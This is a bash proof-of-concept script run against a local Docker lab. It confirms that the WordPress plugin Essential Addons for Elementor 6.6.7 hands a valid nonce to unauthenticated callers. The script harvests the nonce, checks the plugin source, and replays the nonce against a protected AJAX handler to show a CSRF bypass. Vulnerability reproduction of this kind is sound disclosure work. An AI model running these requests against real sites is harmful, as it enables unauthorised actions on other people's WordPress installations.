#!/usr/bin/env bash
# PoC: Essential Addons for Elementor 6.6.7 — unauthenticated nonce vending
# Reproduces finding EAEL-001: eael_get_token returns a valid WP nonce
# to any unauthenticated caller.
set -euo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HOST_PORT="${WP_HOST_PORT:-8101}"
WP_URL="http://127.0.0.1:${HOST_PORT}"
RESULTS="${LAB_DIR}/results.txt"
PLUGIN_SLUG="essential-addons-for-elementor-lite"
PROJECT="wp-essential-addons"
TMP="${LAB_DIR}/tmp"
mkdir -p "${TMP}"
: > "${RESULTS}"
log() { printf '%s\n' "$*" | tee -a "${RESULTS}"; }
sep() { printf '\n===== %s =====\n' "$*" | tee -a "${RESULTS}"; }

sep "Essential Addons for Elementor — Unauth Nonce Vending (EAEL-001)"
log "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
log "Lab:  ${LAB_DIR}"
log "WP:   ${WP_URL}"

# 0. Pinned version
ACTUAL=$(awk '/^ \* Version:/ {print $3; exit}' "${LAB_DIR}/plugin/${PLUGIN_SLUG}/essential_adons_elementor.php" 2>/dev/null | tr -d '\r' || echo unknown)
log "Pinned plugin version: ${ACTUAL} (latest-stable from wordpress.org)"

# 1. Stack health
sep "Step 1: Stack health"
code=$(curl -sL -o /dev/null -w "%{http_code}" "${WP_URL}/" --max-time 10)
log "GET ${WP_URL}/ -> HTTP ${code} (302 -> 200 expected)"
if [ "${code}" != "200" ]; then log "[-] WP not up"; exit 1; fi

ACTIVATED=$( sudo docker run --rm -v "${PROJECT}_wp_data:/var/www/html" \
  -v "${LAB_DIR}/plugin/${PLUGIN_SLUG}:/var/www/html/wp-content/plugins/${PLUGIN_SLUG}:ro" \
  --network "${PROJECT}_default" \
  -e WORDPRESS_DB_HOST=db:3306 -e WORDPRESS_DB_USER=wp -e WORDPRESS_DB_PASSWORD=wp -e WORDPRESS_DB_NAME=wordpress \
  wordpress:cli-2.10-php8.2 wp plugin list --allow-root --path=/var/www/html 2>/dev/null \
  | awk -v s="${PLUGIN_SLUG}" '$1==s {print $2}' )
log "Plugin status: ${ACTIVATED}"
[ "${ACTIVATED}" = "active" ] || { log "[-] plugin not active"; exit 1; }

# 2. Direct unauthenticated call
sep "Step 2: Unauth call to eael_get_token (no cookies, no auth header)"
RESP=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" \
  -d "action=eael_get_token" \
  -w "\n---HTTP %{http_code}---\n" )
printf '%s\n' "${RESP}" | tee -a "${RESULTS}"
NONCE=$( printf '%s' "${RESP}" | python3 -c "import sys,json,re; t=sys.stdin.read(); m=re.search(r'\{.*\}', t, re.S); print(json.loads(m.group(0))['data']['nonce']) if m else print('')" 2>/dev/null || true )
log "[+] parsed nonce: ${NONCE}"
if [ -z "${NONCE}" ]; then log "[-] could not parse nonce; aborting"; exit 1; fi

# 3. Cross-check: WP-style nonce length is 10 chars, alphanumeric; the action
#    name baked in is the one passed to wp_create_nonce() in source.
sep "Step 3: Cross-check nonce is a real WP nonce (10 chars, alnum)"
echo -n "${NONCE}" | wc -c | sed 's/^/    nonce bytes (incl. newline): /' | tee -a "${RESULTS}"
echo -n "${NONCE}" | tr -d '\r\n' | grep -E '^[a-f0-9]{10}$' >/dev/null \
  && log "    [+] nonce matches WP format: yes" \
  || log "    [-] nonce does not match standard WP format"

# 4. Confirm via the source that the handler is registered for nopriv
sep "Step 4: Source verification of the nopriv registration"
sudo docker exec "${PROJECT}-wp-1" grep -n "wp_ajax.*eael_get_token\|public function eael_get_token" \
  /var/www/html/wp-content/plugins/${PLUGIN_SLUG}/includes/Traits/Ajax_Handler.php 2>/dev/null \
  | tee -a "${RESULTS}"

# 5. Use the nonce against a protected handler to demonstrate it's accepted
sep "Step 5: Use the nonce on a protected handler (eael_product_quickview_popup)"
PROT=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" \
  -d "action=eael_product_quickview_popup&nonce=${NONCE}&product_id=999999" \
  -w "\n---HTTP %{http_code}---\n" )
printf '%s\n' "${PROT}" | head -c 500 | tee -a "${RESULTS}"
printf '\n' | tee -a "${RESULTS}"
# The body of -1 means the handler ran with the supplied nonce accepted;
# the product doesn't exist so quickview returns its own "no such product"
# marker. The point is: the request was NOT rejected at the nonce check.

# 6. Replay the unauth call twice; both must succeed
sep "Step 6: Replay (idempotency / no rate limit)"
for n in 1 2 3; do
  R=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" -d "action=eael_get_token" )
  log "    attempt ${n}: ${R}"
done

# 7. Verdict
sep "Verdict"
if [ -n "${NONCE}" ] && [ "${ACTIVATED}" = "active" ]; then
  log "*** EAEL-001 CONFIRMED ***"
  log "An unauthenticated POST to /wp-admin/admin-ajax.php with action=eael_get_token"
  log "returns a valid WP nonce in data.nonce. The handler is registered under"
  log "wp_ajax_nopriv_eael_get_token in includes/Traits/Ajax_Handler.php:68 and"
  log "the nonce is minted from wp_create_nonce('essential-addons-elementor') in"
  log "the same file at line 1643. Nonces minted this way are accepted by every"
  log "EAEL endpoint that calls check_ajax_referer('essential-addons-elementor'),"
  log "which is exactly the cross-endpoint CSRF bypass the finding describes."
else
  log "[-] could not confirm"
  exit 1
fi
